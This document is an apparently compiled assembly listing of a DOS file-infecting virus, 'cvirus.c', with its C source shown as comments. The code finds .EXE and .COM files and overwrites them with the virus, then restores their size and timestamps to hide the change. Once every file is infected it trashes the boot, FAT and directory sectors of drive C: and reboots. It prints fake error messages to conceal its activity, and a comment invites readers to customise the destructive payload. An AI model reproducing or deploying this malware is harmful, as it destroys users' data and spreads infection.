	ifndef	??version
?debug	macro
	endm
$comm	macro	name,dist,size,count
	comm	dist name:BYTE:count*size
	endm
	else
$comm	macro	name,dist,size,count
	comm	dist name[size]:BYTE:count
	endm
	endif
	?debug	S "cvirus.c"
	?debug	C E9A18C4217086376697275732E63
	?debug	C E90008A41413433A5C54435C494E434C5544455C6469722E68
	?debug	C E90008A41413433A5C54435C494E434C5544455C646F732E68
	?debug	C E90008A41415433A5C54435C494E434C5544455C66636E746C2E68
	?debug	C E90008A41412433A5C54435C494E434C5544455C696F2E68
	?debug	C E90008A41416433A5C54435C494E434C5544455C7374646172672E+
	?debug	C 68
	?debug	C E90008A41415433A5C54435C494E434C5544455C737464696F2E68
_TEXT	segment byte public 'CODE'
_TEXT	ends
DGROUP	group	_DATA,_BSS
	assume	cs:_TEXT,ds:DGROUP
_DATA	segment word public 'DATA'
d@	label	byte
d@w	label	word
_DATA	ends
_BSS	segment word public 'BSS'
b@	label	byte
b@w	label	word
_BSS	ends
_DATA	segment word public 'DATA'
_screw_virex	label	byte
	db	245
	db	35
	db	114
	db	150
	db	84
	db	250
	db	227
	db	188
	db	205
	db	4
	db	0
_DATA	ends
_TEXT	segment byte public 'CODE'
   ;	
   ;	void hostile_activity(void)
   ;	
	assume	cs:_TEXT
_hostile_activity	proc	near
	push	bp
	mov	bp,sp
   ;	
   ;	{
   ;		/* Put whatever you feel like doing here...
   ;		   I chose to make this routine trash the victim's boot, FAT, and
   ;		   directory sectors, but you can alter this code however you want,
   ;		   and are encouraged to do so.
   ;		*/
   ;	
   ;	
   ;	#ifdef DEBUG
   ;		puts("\aAll files infected!");
   ;		exit(1);
   ;	#else
   ;		/* Overwrite five sectors, starting with sector 0, on C:, with the
   ;		   memory at location DS:0000 (random garbage).
   ;		*/
   ;	
   ;		abswrite(2, 5, 0, (void *) 0);
   ;	
	xor	ax,ax
	push	ax
	xor	dx,dx
	push	ax
	push	dx
	mov	ax,5
	push	ax
	mov	ax,2
	push	ax
	call	near ptr _abswrite
	add	sp,10
   ;	
   ;		__emit__(0xCD, 0x19);	// Reboot computer
   ;	
	db	205
	db	25
   ;	
   ;	#endif
   ;	}
   ;	
	pop	bp
	ret	
_hostile_activity	endp
_TEXT	ends
_DATA	segment word public 'DATA'
	db	78
	db	77
	db	65
	db	78
	db	0
_DATA	ends
_TEXT	segment byte public 'CODE'
   ;	
   ;	int infected(char *fname)
   ;	
	assume	cs:_TEXT
_infected	proc	near
	push	bp
	mov	bp,sp
	sub	sp,36
	push	si
   ;	
   ;	{
   ;		/* This function determines if fname is infected.  It reads four
   ;		   bytes 28 bytes in from the start and checks them agains the
   ;		   current header.  1 is returned if the file is already infected,
   ;		   0 if it isn't.
   ;		*/
   ;	
   ;		register int handle;
   ;		char virus_signature[35];
   ;		static char check[] = SIGNATURE;
   ;	
   ;		handle = _open(fname, O_RDONLY);
   ;	
	mov	ax,1
	push	ax
	push	word ptr [bp+4]
	call	near ptr __open
	add	sp,4
	mov	si,ax
   ;	
   ;		_read(handle, virus_signature, sizeof(virus_signature));
   ;	
	mov	ax,35
	push	ax
	lea	ax,word ptr [bp-36]
	push	ax
	push	si
	call	near ptr __read
	add	sp,6
   ;	
   ;		close(handle);
   ;	
	push	si
	call	near ptr _close
	inc	sp
	inc	sp
   ;	
   ;	
   ;	#ifdef DEBUG
   ;		printf("Signature for %s:  %.4s\n", fname, &virus_signature[28]);
   ;	#endif
   ;	
   ;		/* This next bit may look really stupid, but it actually saves about
   ;		   100 bytes.
   ;		*/
   ;	
   ;		return((virus_signature[28] == check[0]) && (virus_signature[29] == check[1])
   ;	
   ;	
   ;		       && (virus_signature[30] == check[2]) && (virus_signature[31] == check[3]));
   ;	
	mov	al,byte ptr [bp-8]
	cmp	al,byte ptr DGROUP:d@+11
	jne	short @2@146
	mov	al,byte ptr [bp-7]
	cmp	al,byte ptr DGROUP:d@+11+1
	jne	short @2@146
	mov	al,byte ptr [bp-6]
	cmp	al,byte ptr DGROUP:d@+11+2
	jne	short @2@146
	mov	al,byte ptr [bp-5]
	cmp	al,byte ptr DGROUP:d@+11+3
	jne	short @2@146
	mov	ax,1
	jmp	short @2@170
@2@146:
	xor	ax,ax
@2@170:
   ;	
   ;	}
   ;	
	pop	si
	mov	sp,bp
	pop	bp
	ret	
_infected	endp
   ;	
   ;	void spread(char *virus, struct ffblk *victim)
   ;	
	assume	cs:_TEXT
_spread	proc	near
	push	bp
	mov	bp,sp
	sub	sp,4740
	push	si
	push	di
   ;	
   ;	{
   ;		/* This function infects victim with virus.  First, the victim's
   ;		   attributes are set to 0.  Then the virus is copied into
   ;		   the victim's file name.  Its attributes, file date/time, and
   ;		   size are set to that of the victim's, preventing detection, and
   ;		   the files are closed.
   ;		*/
   ;	
   ;		register int virus_handle, victim_handle;
   ;		unsigned virus_size;
   ;		char virus_code[TOO_SMALL + 1], *victim_name;
   ;	
   ;	
   ;		/* This is used enought to warrant saving it in a separate variable */
   ;	
   ;		victim_name = victim->ff_name;
   ;	
	mov	ax,word ptr [bp+6]
	add	ax,30
	mov	word ptr [bp-4],ax
   ;	
   ;	
   ;	
   ;	#ifdef DEBUG
   ;		printf("Infecting %s with %s...\n", victim_name, virus);
   ;	#endif
   ;	
   ;		/* Turn off all of the victim's attributes so it can be replaced */
   ;	
   ;		_chmod(victim_name, 1, 0);
   ;	
	xor	ax,ax
	push	ax
	mov	ax,1
	push	ax
	push	word ptr [bp-4]
	call	near ptr __chmod
	add	sp,6
   ;	
   ;		
   ;	
   ;	#ifdef DEBUG
   ;		puts("Ok so far...");
   ;	#endif
   ;	
   ;		/* Recreate the victim */
   ;	
   ;		virus_handle = _open(virus, O_RDONLY);
   ;	
	mov	ax,1
	push	ax
	push	word ptr [bp+4]
	call	near ptr __open
	add	sp,4
	mov	di,ax
   ;	
   ;		victim_handle = _creat(victim_name, victim->ff_attrib);
   ;	
	mov	bx,word ptr [bp+6]
	mov	al,byte ptr [bx+21]
	cbw	
	push	ax
	push	word ptr [bp-4]
	call	near ptr __creat
	add	sp,4
	mov	si,ax
   ;	
   ;	
   ;	
   ;		/* Copy virus */
   ;	
   ;		virus_size = _read(virus_handle, virus_code, sizeof(virus_code));
   ;	
	mov	ax,4736
	push	ax
	lea	ax,word ptr [bp-4740]
	push	ax
	push	di
	call	near ptr __read
	add	sp,6
	mov	word ptr [bp-2],ax
   ;	
   ;		_write(victim_handle, virus_code, virus_size);
   ;	
	push	ax
	lea	ax,word ptr [bp-4740]
	push	ax
	push	si
	call	near ptr __write
	add	sp,6
   ;	
   ;	
   ;	
   ;	#ifdef DEBUG
   ;		puts("Almost done...");
   ;	#endif
   ;	
   ;		/* Reset victim's file date, time, and size */
   ;	
   ;		chsize(victim_handle, victim->ff_fsize);
   ;	
	mov	bx,word ptr [bp+6]
	push	word ptr [bx+28]
	push	word ptr [bx+26]
	push	si
	call	near ptr _chsize
	add	sp,6
   ;	
   ;		setftime(victim_handle, (struct ftime *) &victim->ff_ftime);
   ;	
	mov	ax,word ptr [bp+6]
	add	ax,22
	push	ax
	push	si
	call	near ptr _setftime
	add	sp,4
   ;	
   ;	
   ;	
   ;		/* Close files */
   ;	
   ;		close(virus_handle);
   ;	
	push	di
	call	near ptr _close
	inc	sp
	inc	sp
   ;	
   ;		close(victim_handle);
   ;	
	push	si
	call	near ptr _close
	inc	sp
	inc	sp
   ;	
   ;	
   ;	#ifdef DEBUG
   ;		puts("Infection complete!");
   ;	#endif
   ;	}
   ;	
	pop	di
	pop	si
	mov	sp,bp
	pop	bp
	ret	
_spread	endp
_TEXT	ends
_DATA	segment word public 'DATA'
	dw	DGROUP:s@
	dw	DGROUP:s@+6
	db	0
	db	0
_DATA	ends
_BSS	segment word public 'BSS'
	db	43 dup (?)
_BSS	ends
_TEXT	segment byte public 'CODE'
   ;	
   ;	struct ffblk *victim(void)
   ;	
	assume	cs:_TEXT
_victim	proc	near
	push	bp
	mov	bp,sp
	push	si
	push	di
   ;	
   ;	{
   ;		/* This function returns a pointer to the name of the virus's next
   ;		   victim.  This routine is set up to try to infect .EXE and .COM
   ;		   files.  If there is a command line argument, it will try to infect
   ;		   that file instead.  If all files are infected, hostile activity
   ;		   is initiated...
   ;		*/
   ;	
   ;		register int done;
   ;		register char **ext;
   ;		static char *types[] = {"*.EXE", "*.COM", NULL};
   ;		static struct ffblk ffblk;
   ;	
   ;		for (ext = (*++_argv) ? _argv : types; *ext; ext++) {
   ;	
	add	word ptr DGROUP:__argv,2
	mov	bx,word ptr DGROUP:__argv
	cmp	word ptr [bx],0
	je	short @4@74
	mov	ax,word ptr DGROUP:__argv
	jmp	short @4@98
@4@74:
	mov	ax,offset DGROUP:d@w+16
@4@98:
	mov	si,ax
	jmp	short @4@362
@4@122:
   ;	
   ;			done = findfirst(*ext, &ffblk, FA_RDONLY | FA_HIDDEN | FA_SYSTEM | FA_ARCH);
   ;	
	mov	ax,39
	push	ax
	mov	ax,offset DGROUP:b@w+0
	push	ax
	push	word ptr [si]
	call	near ptr _findfirst
	add	sp,6
	jmp	short @4@290
@4@146:
   ;	
   ;			while (!done) {
   ;	
   ;	#ifdef DEBUG
   ;				printf("Scanning %s...\n", ffblk.ff_name);
   ;	#endif
   ;	
   ;		/* If you want to check for specific days of the week, months, etc.,
   ;		   here is the place to insert the code (don't forget to "#include
   ;		   <time.h>").
   ;		*/
   ;	
   ;				if ((ffblk.ff_fsize > TOO_SMALL) && (!infected(ffblk.ff_name)))
   ;	
	cmp	word ptr DGROUP:b@w+0+28,0
	jl	short @4@266
	jg	short @4@218
	cmp	word ptr DGROUP:b@w+0+26,4735
	jbe	short @4@266
@4@218:
	mov	ax,offset DGROUP:b@w+0+30
	push	ax
	call	near ptr _infected
	inc	sp
	inc	sp
	or	ax,ax
	jne	short @4@266
   ;	
   ;					return(&ffblk);
   ;	
	mov	ax,offset DGROUP:b@w+0
	jmp	short @4@410
@4@266:
   ;	
   ;				done = findnext(&ffblk);
   ;	
	mov	ax,offset DGROUP:b@w+0
	push	ax
	call	near ptr _findnext
	inc	sp
	inc	sp
@4@290:
	mov	di,ax
	or	di,di
	je	short @4@146
	inc	si
	inc	si
@4@362:
	cmp	word ptr [si],0
	jne	short @4@122
   ;	
   ;			}
   ;		}
   ;	
   ;	
   ;		/* If there are no files left to infect, have a little fun */
   ;	
   ;		hostile_activity();
   ;	
	call	near ptr _hostile_activity
@4@410:
   ;	
   ;	}
   ;	
	pop	di
	pop	si
	pop	bp
	ret	
_victim	endp
_TEXT	ends
_DATA	segment word public 'DATA'
	dw	DGROUP:s@+12
	dw	DGROUP:s@+26
	dw	DGROUP:s@+41
	dw	DGROUP:s@+61
	dw	DGROUP:s@+78
	dw	DGROUP:s@+97
	dw	DGROUP:s@+115
	dw	DGROUP:s@+144
_DATA	ends
_TEXT	segment byte public 'CODE'
   ;	
   ;	int main(void)
   ;	
	assume	cs:_TEXT
_main	proc	near
	push	bp
	mov	bp,sp
	push	si
   ;	
   ;	{
   ;		/* In the main program, a victim is found and infected.  If all files
   ;		   are infected, a malicious action is performed.  Otherwise, a bogus
   ;		   error message is displayed, and the virus terminates with code
   ;		   1, simulating an error.
   ;		*/
   ;	
   ;		static char *err_msg[] = {"Out of memory", "Bad EXE format",
   ;					  "Invalid DOS version", "Bad memory block",
   ;					  "FCB creation error", "Sharing violation",
   ;					  "Abnormal program termination",
   ;					  "Divide error"
   ;					 };
   ;		register char *virus_name = *_argv;
   ;	
	mov	bx,word ptr DGROUP:__argv
	mov	si,word ptr [bx]
   ;	
   ;	
   ;		spread(virus_name, victim());
   ;	
	call	near ptr _victim
	push	ax
	push	si
	call	near ptr _spread
	add	sp,4
   ;	
   ;		puts(err_msg[peek(0, 0x46C) % (sizeof(err_msg) / sizeof(char *))]);
   ;	
	xor	ax,ax
	mov	es,ax
	mov	bx,word ptr es:[1132]
	and	bx,7
	shl	bx,1
	push	word ptr DGROUP:d@w+22[bx]
	call	near ptr _puts
	inc	sp
	inc	sp
   ;	
   ;		return(1);
   ;	
	mov	ax,1
   ;	
   ;	}
   ;	
	pop	si
	pop	bp
	ret	
_main	endp
	?debug	C E9
_TEXT	ends
_DATA	segment word public 'DATA'
s@	label	byte
	db	'*.EXE'
	db	0
	db	'*.COM'
	db	0
	db	'Out of memory'
	db	0
	db	'Bad EXE format'
	db	0
	db	'Invalid DOS version'
	db	0
	db	'Bad memory block'
	db	0
	db	'FCB creation error'
	db	0
	db	'Sharing violation'
	db	0
	db	'Abnormal program termination'
	db	0
	db	'Divide error'
	db	0
_DATA	ends
_TEXT	segment byte public 'CODE'
_TEXT	ends
	extrn	__creat:near
	extrn	__open:near
	public	_infected
	extrn	_findfirst:near
	extrn	_findnext:near
	public	_hostile_activity
	extrn	_setftime:near
	extrn	__read:near
	public	_victim
	extrn	_puts:near
	extrn	__argv:word
	public	_main
	extrn	_chsize:near
	public	_screw_virex
	extrn	_close:near
	public	_spread
	extrn	__write:near
	extrn	__chmod:near
	extrn	_abswrite:near
	end
